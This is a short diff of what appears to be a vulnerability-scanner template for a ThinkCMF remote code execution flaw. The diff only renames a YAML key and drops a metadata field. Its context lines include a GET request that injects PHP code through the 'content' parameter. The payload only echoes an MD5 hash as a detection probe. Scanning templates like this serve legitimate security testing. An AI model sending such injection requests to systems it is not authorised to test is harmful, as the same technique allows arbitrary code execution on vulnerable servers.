@@ -8,10 +8,8 @@ info:
   reference:
     - https://www.shuzhiduo.com/A/l1dygr36Je/
   tags: thinkcmf,rce
-  metadata:
-    max-request: 1
 
-http:
+requests:
   - method: GET
     path:
       - "{{BaseURL}}/index.php?g=g&m=Door&a=index&content=<?php%20echo%20md5('ThinkCMF');"
